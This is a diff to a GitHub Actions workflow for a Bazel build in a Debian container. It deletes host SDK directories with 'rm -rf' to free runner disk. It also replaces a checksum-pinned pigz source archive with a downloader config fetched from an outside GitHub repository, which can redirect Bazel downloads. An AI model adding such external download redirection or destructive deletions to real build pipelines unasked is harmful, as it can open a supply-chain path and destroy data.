@@ -26,11 +26,27 @@ jobs:
             runner: ubuntu-24.04-arm
     runs-on: ${{ matrix.runner }}
     timeout-minutes: 120
-    container: debian:trixie-20260918@sha256:9cc080028c43b27d2074d63a5f9caf7166d731494965616c1a6d2827a004585c
+    container:
+      image: debian:trixie-20260918@sha256:9cc080028c43b27d2074d63a5f9caf7166d731494965616c1a6d2827a004585c
+      volumes:
+        - /usr/local/lib/android:/runner-unused/android
+        - /usr/share/dotnet:/runner-unused/dotnet
+        - /opt/ghc:/runner-unused/ghc
     defaults:
       run:
         shell: bash
     steps:
+      - name: Allocate source-build space on this disposable runner
+        if: matrix.architecture == 'amd64'
+        run: |
+          test "$RUNNER_ENVIRONMENT" = github-hosted
+          df -h / "$GITHUB_WORKSPACE"
+          du -sh /runner-unused/android /runner-unused/dotnet /runner-unused/ghc
+          # These host SDKs are not inputs to the pinned Trixie build. Preserve
+          # all Bazel caches, the workspace, retained outputs and execution tools.
+          find /runner-unused/android /runner-unused/dotnet /runner-unused/ghc \
+            -mindepth 1 -maxdepth 1 -exec rm -rf -- {} +
+          df -h / "$GITHUB_WORKSPACE"
       - name: Install execution and verification tools
         run: |
           apt-get update
@@ -46,13 +62,29 @@ jobs:
           repository-cache: true
           disk-cache: base-images-${{ matrix.architecture }}
           cache-version: "8.5.1"
-      - name: Prepare the checksum-pinned pigz source archive
+      - name: Preserve setup-bazel caches for source checks
+        run: python3 tools/bazel/ci/preserve_setup_bazel_cache.py
+
+      - name: Configure the verified source mirror
         run: |
-          mkdir -p artifacts/source-downloads
-          python3 -B tools/bazel/gzip/prepare_pigz.py \
-            --output "$PWD/artifacts/source-downloads" | tee artifacts/pigz-source.json
-          # common.bazelrc imports this ignored file, including through the shared CI entry point.
-          printf 'common --distdir=%s\n' "$PWD/artifacts/source-downloads" >> .bazelrc.user
+          python3 - <<'PYCFG'
+          import hashlib
+          import os
+          from pathlib import Path
+          from urllib.request import urlopen
+          # Pin the transport fallback; Bazel still verifies BCR integrity.
+          url = "https://raw.githubusercontent.com/securely1g/sonic-bazel-registry/6e305126f13965fd01b6b3aa06e98d4595832d39/ci/source_mirrors.cfg"
+          with urlopen(url, timeout=60) as response:
+              data = response.read()
+          expected = "e9f004bfce0501f998c7d624d028d40c72eabddc12c1f7b34fc474f14042d6a8"
+          if hashlib.sha256(data).hexdigest() != expected:
+              raise SystemExit("Source mirror configuration checksum mismatch")
+          config = Path(os.environ["RUNNER_TEMP"]) / "sonic-source-mirrors.cfg"
+          config.write_bytes(data)
+          with Path(".bazelrc.user").open("a") as rc:
+              rc.write("common --experimental_downloader_config=" + str(config) + "\n")
+          PYCFG
+
 
       - name: Check clean dependency inputs
         run: |
